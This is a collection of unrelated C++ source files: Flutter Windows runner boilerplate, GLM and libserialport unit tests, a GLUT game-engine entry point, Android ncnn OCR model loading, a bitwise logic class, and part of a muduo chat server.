    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include <glm/ext/matrix_relational.hpp>\n#include <glm/ext/vector_relational.hpp>\n#include <glm/ext/scalar_relational.hpp>\n#include <glm/gtc/constants.hpp>\n#include <glm/matrix.hpp>\n#include <glm/vector_relational.hpp>\n#include <glm/mat2x2.hpp>\n#include <glm/mat2x3.hpp>\n#include <glm/mat2x4.hpp>\n#include <glm/mat3x2.hpp>\n#include <glm/mat3x3.hpp>\n#include <glm/mat3x4.hpp>\n#include <glm/mat4x2.hpp>\n#include <glm/mat4x3.hpp>\n#include <glm/mat4x4.hpp>\n#include <vector>\n\nint test_operators()\n{\n\tglm::mat2x2 l(1.0f);\n\tglm::mat2x2 m(1.0f);\n\tglm::vec2 u(1.0f);\n\tglm::vec2 v(1.0f);\n\tfloat x = 1.0f;\n\tglm::vec2 a = m * u;\n\tglm::vec2 b = v * m;\n\tglm::mat2x2 n = x / m;\n\tglm::mat2x2 o = m / x;\n\tglm::mat2x2 p = x * m;\n\tglm::mat2x2 q = m * x;\n\tbool R = glm::any(glm::notEqual(m, q, glm::epsilon<float>()));\n\tbool S = glm::all(glm::equal(m, l, glm::epsilon<float>()));\n\n\treturn (S && !R) ? 0 : 1;\n}\n\nint test_inverse()\n{\n\tint Error(0);\n\n\t{\n\t\tglm::mat2 const Matrix(1, 2, 3, 4);\n\t\tglm::mat2 const Inverse = glm::inverse(Matrix);\n\t\tglm::mat2 const Identity = Matrix * Inverse;\n\n\t\tError += glm::all(glm::equal(Identity[0], glm::vec2(1.0f, 0.0f), glm::vec2(0.01f))) ? 0 : 1;\n\t\tError += glm::all(glm::equal(Identity[1], glm::vec2(0.0f, 1.0f), glm::vec2(0.01f))) ? 0 : 1;\n\t}\n\n\t{\n\t\tglm::mat2 const Matrix(1, 2, 3, 4);\n\t\tglm::mat2 const Identity = Matrix / Matrix;\n\n\t\tError += glm::all(glm::equal(Identity[0], glm::vec2(1.0f, 0.0f), glm::vec2(0.01f))) ? 0 : 1;\n\t\tError += glm::all(glm::equal(Identity[1], glm::vec2(0.0f, 1.0f), glm::vec2(0.01f))) ? 0 : 1;\n\t}\n\n\treturn Error;\n}\n\nint test_ctr()\n{\n\tint Error = 0;\n\t\n\t{\n\t\tglm::mediump_mat2x2 const A(1.0f);\n\t\tglm::highp_mat2x2 const B(A);\n\t\tglm::mediump_mat2x2 const C(B);\n\n\t\tError += glm::all(glm::equal(A, C, glm::epsilon<float>())) ? 0 : 1;\n\t}\n\n#if GLM_HAS_INITIALIZER_LISTS\n\tglm::mat2x2 m0(\n\t\tglm::vec2(0, 1),\n\t\tglm::vec2(2, 3));\n\n\tglm::mat2x2 m1{0, 1, 2, 3};\n\n\tglm::mat2x2 m2{\n\t\t{0, 1},\n\t\t{2, 3}};\n\n\tError += glm::all(glm::equal(m0, m2, glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(m1, m2, glm::epsilon<float>())) ? 0 : 1;\n\n\tstd::vector<glm::mat2x2> v1{\n\t\t{0, 1, 2, 3},\n\t\t{0, 1, 2, 3}\n\t};\n\n\tstd::vector<glm::mat2x2> v2{\n\t\t{\n\t\t\t{ 0, 1},\n\t\t\t{ 4, 5}\n\t\t},\n\t\t{\n\t\t\t{ 0, 1},\n\t\t\t{ 4, 5}\n\t\t}\n\t};\n\n#endif//GLM_HAS_INITIALIZER_LISTS\n\n\treturn Error;\n}\n\nnamespace cast\n{\n\ttemplate<typename genType>\n\tint entry()\n\t{\n\t\tint Error = 0;\n\n\t\tgenType A(1.0f);\n\t\tglm::mat2 B(A);\n\t\tglm::mat2 Identity(1.0f);\n\n\t\tError += glm::all(glm::equal(B, Identity, glm::epsilon<float>())) ? 0 : 1;\n\n\t\treturn Error;\n\t}\n\n\tint test()\n\t{\n\t\tint Error = 0;\n\t\t\n\t\tError += entry<glm::mat2x2>();\n\t\tError += entry<glm::mat2x3>();\n\t\tError += entry<glm::mat2x4>();\n\t\tError += entry<glm::mat3x2>();\n\t\tError += entry<glm::mat3x3>();\n\t\tError += entry<glm::mat3x4>();\n\t\tError += entry<glm::mat4x2>();\n\t\tError += entry<glm::mat4x3>();\n\t\tError += entry<glm::mat4x4>();\n\n\t\treturn Error;\n\t}\n}//namespace cast\n\nint test_size()\n{\n\tint Error = 0;\n\n\tError += 16 == sizeof(glm::mat2x2) ? 0 : 1;\n\tError += 32 == sizeof(glm::dmat2x2) ? 0 : 1;\n\tError += glm::mat2x2().length() == 2 ? 0 : 1;\n\tError += glm::dmat2x2().length() == 2 ? 0 : 1;\n\tError += glm::mat2x2::length() == 2 ? 0 : 1;\n\tError += glm::dmat2x2::length() == 2 ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_constexpr()\n{\n#if GLM_HAS_CONSTEXPR\n\tstatic_assert(glm::mat2x2::length() == 2, \"GLM: Failed constexpr\");\n#endif\n\n\treturn 0;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += cast::test();\n\tError += test_ctr();\n\tError += test_operators();\n\tError += test_inverse();\n\tError += test_size();\n\tError += test_constexpr();\n\n\treturn Error;\n}\n",
    "// Darius Kellermann <kellermann@pm.me>, March 2024\n\n// Unit tests the C++ interface by mocking the libserialport API.\n// These scenarios focus on the automatic memory management.\n\n#include <libserialport.hpp>\n\n#include \"libserialport_mock.hpp\"\n\n#include <catch2/catch_test_macros.hpp>\n\nSCENARIO(\"port list memory is managed automatically\") {\n  REQUIRE(sp_mock::number_of_allocated_lists() == 0);\n  REQUIRE(sp_mock::number_of_allocated_ports() == 0);\n\n  GIVEN(\"a list of ports\") {\n    auto list = sp::list_ports();\n    WHEN(\"the list has been acquired\") {\n      THEN(\"ports are allocated, list is free'd already\") {\n        CHECK(sp_mock::number_of_allocated_lists() == 0);\n        CHECK(sp_mock::number_of_allocated_ports() == 2);\n      }\n      AND_WHEN(\"the list is cleared\") {\n        list.clear();\n        THEN(\"no ports or lists are allocated anymore\") {\n          CHECK(sp_mock::number_of_allocated_lists() == 0);\n          CHECK(sp_mock::number_of_allocated_ports() == 0);\n        }\n      }\n    }\n  }\n}\n\nSCENARIO(\"port memory is managed automatically\") {\n  REQUIRE(sp_mock::number_of_allocated_ports() == 0);\n\n  GIVEN(\"a port\") {\n    auto port = sp::get_port_by_name(\"\");\n\n    WHEN(\"acquired\") {\n      THEN(\"memory is allocated\") {\n        REQUIRE(sp_mock::number_of_allocated_ports() == 1);\n      }\n\n      WHEN(\"smart pointer is reset\") {\n        port.reset();\n        THEN(\"memory is freed\") {\n          REQUIRE(sp_mock::number_of_allocated_ports() == 0);\n        }\n      }\n    }\n  }\n}\n\nSCENARIO(\"config memory is managed automatically\") {\n  {\n    auto port = sp::get_port_by_name(\"\");\n    REQUIRE(sp_mock::number_of_allocated_ports() == 1);\n    auto conn = sp::connection{port, {}, {}};\n    auto cfg = conn.get_config();\n    conn.set_config(cfg);\n    REQUIRE(sp_mock::number_of_allocated_configs() == 0);\n  }\n  REQUIRE(sp_mock::number_of_allocated_ports() == 0);\n}\n\nSCENARIO(\"error message is free'd via the `shared_ptr`\") {\n  GIVEN(\"an error with static message\") {\n    sp_mock::set_next_status(sp::status_t::OK);\n    sp::get_usb_bus_address({}); // call a random function that sets the status\n    REQUIRE(sp::get_status() == sp::status_t::OK);\n\n    auto msg = sp::last_error_message();\n    REQUIRE(sp_mock::number_of_allocated_messages() == 0);\n\n    WHEN(\"resetting the smart pointer\") {\n      msg.reset();\n      THEN(\"no memory is freed, because none was allocated\") {}\n    }\n  }\n\n  GIVEN(\"an error with allocated message\") {\n    sp_mock::set_next_status(sp::status_t::SystemError);\n    sp::get_usb_bus_address({}); // call a random function that sets the status\n    REQUIRE(sp::get_status() == sp::status_t::SystemError);\n    sp_mock::set_next_status(sp::status_t::OK); // reset next status\n\n    auto msg = sp::last_error_message();\n    REQUIRE(sp_mock::number_of_allocated_messages() == 1);\n\n    WHEN(\"resetting the smart pointer\") {\n      msg.reset();\n      THEN(\"memory is freed\") {\n        REQUIRE(sp_mock::number_of_allocated_messages() == 0);\n      }\n    }\n  }\n}\n",
    "#include \"Engine/Engine.cpp\"\n\nstatic void InitializeGlutCallbacks() {\n    glutDisplayFunc(RenderSceneCB);\n    glutIdleFunc(RenderSceneCB);\n    //glutSpecialFunc(SpecialKeyboardCB);\n    //glutPassiveMotionFunc(PassiveMouseCB);\n    //glutKeyboardFunc(KeyboardCB);\n}\n// Main Start Point\nint main(int argc, char** argv)\n{\n    // Setting Up The Window\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_DOUBLE|GLUT_RGBA|GLUT_DEPTH);\n    glutInitWindowSize(WINDOW_WIDTH, WINDOW_HEIGHT);\n    int x = 200; int y = 100;\n    glutInitWindowPosition(x, y);\n    // Making The Window\n    int win = glutCreateWindow(\"Game Engine\");\n    InitializeGlutCallbacks();\n\n    // Must be done after glut is initialized!\n    GLenum res = glewInit();\n    if (res != GLEW_OK) {\n        fprintf(stderr, \"Error: '%s'\\n\", glewGetErrorString(res));\n        return 1;\n    }\n    // Clearing The Window with just black\n    glClearColor(0.0f, 0.0f, 0.0f, 0.0f);\n    // Creating the Buffers\n    CreateVertexBuffer();\n    CreateIndexBuffer();\n    // Compile The Shaders\n    CompileShaders();\n    // Player Settings\n    gPersProjInfo.FOV = 30.0f;\n    gPersProjInfo.Height = WINDOW_HEIGHT;\n    gPersProjInfo.Width = WINDOW_WIDTH;\n    gPersProjInfo.zNear = 1.0f;\n    gPersProjInfo.zFar = 100.0f;\n\n    \n\n    // Keeping The Window Open\n    glutMainLoop();\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//\n// Created by Haomin Kong on 2024/2/11.\n//\n\n#include \"CAS_OCR_ANDROID.h\"\n\nextern std::string logcat_tag;\n\nnamespace CAS_OCR {\n    static ncnn::UnlockedPoolAllocator g_blob_pool_allocator;\n    static ncnn::PoolAllocator g_workspace_pool_allocator;\n\n    extern ncnn::Net net_equal_symbol;\n    extern ncnn::Net net_operator;\n    extern ncnn::Net net_digit;\n\n    bool init_model_from_assets(\n            ncnn::Net &net,\n            AAssetManager *mgr,\n            std::string name,\n            std::string precision\n    ) {\n        const auto file_name_param = name + \".\" + precision + \".param\";\n        int ret = net.load_param(mgr, file_name_param.c_str());\n        if (ret != 0) {\n            __android_log_print(\n                    ANDROID_LOG_ERROR,\n                    logcat_tag.c_str(),\n                    \"load_param failed!\"\n            );\n            return false;\n        }\n\n        const auto file_name_model = name + \".\" + precision + \".bin\";\n        ret = net.load_model(mgr, file_name_model.c_str());\n        if (ret != 0) {\n            __android_log_print(\n                    ANDROID_LOG_ERROR,\n                    logcat_tag.c_str(),\n                    \"load_model failed!\"\n            );\n            return false;\n        }\n\n        return true;\n    }\n\n    void set_net_opt(ncnn::Net &net) {\n        ncnn::Option &opt = net.opt;\n        opt.lightmode = true;\n        opt.num_threads = 4;\n        opt.blob_allocator = &g_blob_pool_allocator;\n        opt.workspace_allocator = &g_workspace_pool_allocator;\n\n        // use vulkan compute\n        if (ncnn::get_gpu_count() != 0)\n            opt.use_vulkan_compute = true;\n\n        //    net.opt = opt;\n    }\n\n    bool init_all_model_from_assets(AAssetManager *mgr) {\n        CAS_OCR::set_net_opt(net_equal_symbol);\n        CAS_OCR::set_net_opt(net_operator);\n        CAS_OCR::set_net_opt(net_digit);\n\n        bool isSuccessful = true;\n\n        isSuccessful = CAS_OCR::init_model_from_assets(\n                net_equal_symbol,\n                mgr,\n                \"resnet18_equal_symbol_latest\",\n                \"fp16\"\n        ) && isSuccessful;\n\n        isSuccessful = CAS_OCR::init_model_from_assets(\n                net_operator,\n                mgr,\n                \"resnet18_operator_latest\",\n                \"fp16\"\n        ) && isSuccessful;\n\n        isSuccessful = CAS_OCR::init_model_from_assets(\n                net_digit,\n                mgr,\n                \"resnet34_digit_latest\",\n                \"fp16\"\n        ) && isSuccessful;\n\n        return isSuccessful;\n    }\n}",
    "#include <iostream>\nusing namespace std;\n\nclass logical_values_array{\n    unsigned int  value;\npublic:\n    unsigned int get_value(){return value;}\n    logical_values_array(unsigned int  a=0){value=a;}\n    void Inversia();\n    logical_values_array Conjuncture(logical_values_array b);\n    logical_values_array Disjunction(logical_values_array b);\n    logical_values_array Implication(logical_values_array b);\n    logical_values_array Coimplication(logical_values_array b);\n    logical_values_array Addition_modulo_2(logical_values_array b);\n    logical_values_array Equivalence(logical_values_array b);\n    logical_values_array Pierce_arrow(logical_values_array b);\n    logical_values_array Schaeffer_touch(logical_values_array b);\n    bool equals(logical_values_array b);\n    unsigned int get_bit(unsigned int n){return (value >> (31-n)) & 1u;}\n    void to_binary(char* buf);\n    void setMemory(char *addrs);\n\n};\n\n\nvoid logical_values_array::Inversia(){ //\u0438\u043d\u0432\u0435\u0440\u0441\u0438\u044f\n    if (value==0) value=1;\n    else value=0;\n}\n\nlogical_values_array logical_values_array::Conjuncture(logical_values_array b){\n    logical_values_array vrem;\n    vrem=(value*b.value==0)?(0):(1);\n    return vrem;\n}\n\nlogical_values_array logical_values_array::Disjunction(logical_values_array b){\n    logical_values_array vrem;\n    vrem=(value+b.value==0)?(0):(1);\n    return vrem;\n}\n\nlogical_values_array logical_values_array::Implication(logical_values_array b){\n    logical_values_array vrem;\n    vrem.value=(value==0 and b.value>0)?(0):(1);\n    return vrem;\n}\n\nlogical_values_array logical_values_array::Coimplication(logical_values_array b){\n    logical_values_array vrem;\n    vrem.value=(value==0 and b.value>0)?(1):(0);\n    return vrem;\n}\n\nlogical_values_array logical_values_array::Addition_modulo_2(logical_values_array b){\n    logical_values_array vrem;\n    vrem = this->Equivalence(b);\n    vrem.Inversia();\n    return vrem;\n}\n\nlogical_values_array logical_values_array::Equivalence(logical_values_array b){\n    logical_values_array vrem;\n    vrem.value=((value==0 and b.value==0) or (value>0 and b.value>0))?(1):(0);\n    return vrem;\n}\n\nlogical_values_array logical_values_array::Pierce_arrow(logical_values_array b){\n    logical_values_array vrem;\n    vrem=this->Disjunction(b);\n    vrem.Inversia();\n    return vrem;\n}\n\nlogical_values_array logical_values_array::Schaeffer_touch(logical_values_array b){\n    logical_values_array vrem;\n    vrem=this->Conjuncture(b);\n    vrem.Inversia();\n    return vrem;\n}\n\nbool logical_values_array::equals(logical_values_array b){\n    return (value==b.value);\n}\n\nvoid logical_values_array::to_binary(char* buf) {\n    char *pb = buf + 32;\n    *pb-- = '\\0';\n    //cout << this->get_bit(30) + '0' << endl;\n    for (int i = 31; i >= 0; i--) {\n        buf[i] = this->get_bit(i) + '0';\n    }\n}\n\nvoid logical_values_array::setMemory(char *addrs){\n        if(addrs == nullptr) return;\n        for(unsigned int i = 0; i < sizeof(unsigned int)*8; i++){\n            *addrs++ = '0' + get_bit(i);\n        }\n        *addrs = '\\0';\n}\n\nint main() {\n    logical_values_array a(3);\n    logical_values_array b(10);\n    char *arr=new char[33];\n    //a.setMemory(arr);\n    a.to_binary(arr);\n    cout<<arr;\n\n    a.Inversia();\n    //cout<<a.get_value()<<endl;\n    //cout<<a.Conjuncture(b).get_value()<<endl;\n    //cout<<a.Disjunction(b).get_value()<<endl;\n    //cout<<a.Implication(b).get_value()<<endl;\n    //cout<<a.Coimplication(b).get_value()<<endl;\n    //cout<<a.Equivalence(b).get_value()<<endl;\n    //cout<<a.Addition_modulo_2(b).get_value()<<endl;\n    //cout<<a.Pierce_arrow(b).get_value()<<endl;\n    //cout<<a.Schaeffer_touch(b).get_value()<<endl;\n    //cout<<a.equals(b)<<endl;\n    //cout<<a.get_bit(29)<<endl;\n\n\n    return 0;\n}\n",
    "#include \"chatservice.hpp\"\n\n#include <muduo/base/Logging.h>\n\n#include <iostream>\n#include <map>\n#include <string>\n#include <vector>\n\n#include \"public.hpp\"\nusing namespace std;\nusing namespace muduo;\n\n// namespace std;\n\n// \u83b7\u53d6\u5355\u4f8b\u5bf9\u8c61\u7684\u63a5\u53e3\u51fd\u6570\nChatService *ChatService::instance() {\n  static ChatService service;\n  return &service;\n}\n// \u6ce8\u518c\u6d88\u606f\u4ee5\u53ca\u5bf9\u5e94\u7684Handler\u56de\u8c03\u64cd\u4f5c\nChatService::ChatService() {\n  _msgHandlerMap.insert(\n      {LOGIN_MSG, std::bind(&ChatService::login, this, _1, _2, _3)});\n  _msgHandlerMap.insert(\n      {REG_MSG, std::bind(&ChatService::reg, this, _1, _2, _3)});\n  _msgHandlerMap.insert(\n      {ONE_CHAT_MSG, std::bind(&ChatService::oneChat, this, _1, _2, _3)});\n  _msgHandlerMap.insert(\n      {ADD_FRIEND_MSG, std::bind(&ChatService::addFriend, this, _1, _2, _3)});\n\n  // \u7fa4\u7ec4\u4e1a\u52a1\u7ba1\u7406\u76f8\u5173\u4e8b\u4ef6\u5904\u7406\u56de\u8c03\u6ce8\u518c\n  _msgHandlerMap.insert({CREATE_GROUP_MSG, std::bind(&ChatService::createGroup,\n                                                     this, _1, _2, _3)});\n  _msgHandlerMap.insert(\n      {ADD_GROUP_MSG, std::bind(&ChatService::addGroup, this, _1, _2, _3)});\n  _msgHandlerMap.insert(\n      {GROUP_CHAT_MSG, std::bind(&ChatService::groupChat, this, _1, _2, _3)});\n  _msgHandlerMap.insert(\n      {LOGINOUT_MSG, std::bind(&ChatService::loginOut, this, _1, _2, _3)});\n  // \u94fe\u63a5redis\u670d\u52a1\u5668\n  if (_redis.connect()) {\n    // \u8bbe\u7f6e\u4e0a\u62a5\u6d88\u606f\u7684\u56de\u8c03\n\n    _redis.init_notify_handler(\n        std::bind(&ChatService::handleRedisSubscribeMessage, this, _1, _2));\n  }\n}\n\n// \u670d\u52a1\u5668\u5f02\u5e38\uff0c\u4e1a\u52a1\u91cd\u7f6e\u65b9\u6cd5\nvoid ChatService::reset() { _userModel.resetState(); }\n// \u83b7\u53d6\u6d88\u606f\u5bf9\u5e94\u7684\u5904\u7406\u5668\nMsgHandler ChatService::getHandler(int msgid) {\n  // \u8bb0\u5f55\u9519\u8bef\u65e5\u5fd7\uff0cmsgid\u6ca1\u6709\u5bf9\u5e94\u7684\u4e8b\u4ef6\u5904\u7406\u56de\u8c03\n  auto it = _msgHandlerMap.find(msgid);\n  if (it == _msgHandlerMap.end()) {\n    // LOG_ERROR<<\"msgid:\"<<msgid<<\"can not find handler!\";\n    // \u8fd4\u56de\u4e00\u4e2a\u9ed8\u8ba4\u5904\u7406\u5668\uff0c\u7a7a\u64cd\u4f5c\n    return [=](const TcpConnectionPtr &conn, json &js, Timestamp time) {\n      LOG_ERROR << \"msgid:\" << msgid << \"can not find handler!\";\n    };\n\n  } else {\n    return _msgHandlerMap[msgid];\n  }\n}\n// \u5904\u7406\u767b\u5f55\u4e1a\u52a1\n// \u5904\u7406\u767b\u5f55\u4e1a\u52a1  id  pwd   pwd\nvoid ChatService::login(const TcpConnectionPtr &conn, json &js,\n                        Timestamp time) {\n  int id = js[\"id\"].get<int>();\n  string pwd = js[\"password\"];\n\n  User user = _userModel.query(id);\n  if (user.getId() == id && user.getPassword() == pwd) {\n    if (user.getState() == \"online\") {\n      // \u8be5\u7528\u6237\u5df2\u7ecf\u767b\u5f55\uff0c\u4e0d\u5141\u8bb8\u91cd\u590d\u767b\u5f55\n      json response;\n      response[\"msgid\"] = LOGIN_MSG_ACK;\n      response[\"errno\"] = 2;\n      response[\"errmsg\"] = \"this account is using, input another!\";\n      conn->send(response.dump());\n    } else {\n      // \u767b\u5f55\u6210\u529f\uff0c\u8bb0\u5f55\u7528\u6237\u8fde\u63a5\u4fe1\u606f\n      {\n        lock_guard<mutex> lock(_connMutex);\n        _userConnMap.insert({id, conn});\n      }\n\n      // id\u7528\u6237\u767b\u5f55\u6210\u529f\u540e\uff0c\u5411redis\u8ba2\u9605channel(id)\n      _redis.subscribe(id);\n      // \u767b\u5f55\u6210\u529f\uff0c\u66f4\u65b0\u7528\u6237\u72b6\u6001\u4fe1\u606f state offline=>online\n      user.setState(\"online\");\n      _userModel.updateState(user);\n\n      json response;\n      response[\"msgid\"] = LOGIN_MSG_ACK;\n      response[\"errno\"] = 0;\n      response[\"id\"] = user.getId();\n      response[\"name\"] = user.getName();\n      // \u67e5\u8be2\u8be5\u7528\u6237\u662f\u5426\u6709\u79bb\u7ebf\u6d88\u606f\n      vector<string> vec = _offlineMsgModel.query(id);\n      if (!vec.empty()) {\n        response[\"offlinemsg\"] = vec;\n        // \u8bfb\u53d6\u8be5\u7528\u6237\u7684\u79bb\u7ebf\u6d88\u606f\u540e\uff0c\u628a\u8be5\u7528\u6237\u7684\u6240\u6709\u79bb\u7ebf\u6d88\u606f\u5220\u9664\u6389\n        _offlineMsgModel.remove(id);\n      }\n\n      // \u67e5\u8be2\u8be5\u7528\u6237\u7684\u597d\u53cb\u4fe1\u606f\u5e76\u8fd4\u56de\n      vector<User> userVec = _friendModel.query(id);\n      if (!userVec.empty()) {\n        vector<string> vec2;\n        for (User &user : userVec) {\n          json js;\n          js[\"id\"] = user.getId();\n          js[\"name\"] = user.getName();\n          js[\"state\"] = user.getState();\n          vec2.push_back(js.dump());\n        }\n        response[\"friends\"] = vec2;\n      }\n      // \u67e5\u8be2\u7528\u6237\u7684\u7fa4\u7ec4\u4fe1\u606f\n      vector<Group> groupuserVec = _groupModel.queryGroups(id);\n      if (!groupuserVec.empty()) {\n        // group:[{groupid:[xxx, xxx, xxx, xxx]}]\n        vector<string> groupV;\n        for (Group &group : groupuserVec) {\n          json grpjson;\n          grpjson[\"id\"] = group.getId();\n          grpjson[\"groupname\"] = group.getName();\n          grpjson[\"groupdesc\"] = group.getDesc();\n          vector<string> userV;\n          for (GroupUser &user : group.getUsers()) {\n            json js;\n            js[\"id\"] = user.getId();\n            js[\"name\"] = user.getName();\n            js[\"state\"] = user.getState();\n            js[\"role\"] = user.getRole();\n            userV.push_back(js.dump());\n          }\n          grpjson[\"users\"] = userV;\n          groupV.push_back(grpjson.dump());\n        }\n\n        response[\"groups\"] = groupV;\n      }\n\n      conn->send(response.dump());\n    }\n  } else {\n    // \u8be5\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u7528\u6237\u5b58\u5728\u4f46\u662f\u5bc6\u7801\u9519\u8bef\uff0c\u767b\u5f55\u5931\u8d25\n    json response;\n    response[\"msgid\"] = LOGIN_MSG_ACK;\n    response[\"errno\"] = 1;\n    response[\"errmsg\"] = \"id or password is invalid!\";\n    conn->send(response.dump());\n  }\n}\n\n// \u5904\u7406\u6ce8\u518c\u4e1a\u52a1 name password\nvoid ChatService::reg(const TcpConnectionPtr &conn, json &js, Timestamp time) {\n  string name = js[\"name\"];\n  string password = js[\"password\"];\n  cout << name << \"   \" << password << endl;\n  User user;\n  user.setName(name);\n  user.setPasswor",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"navigation\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
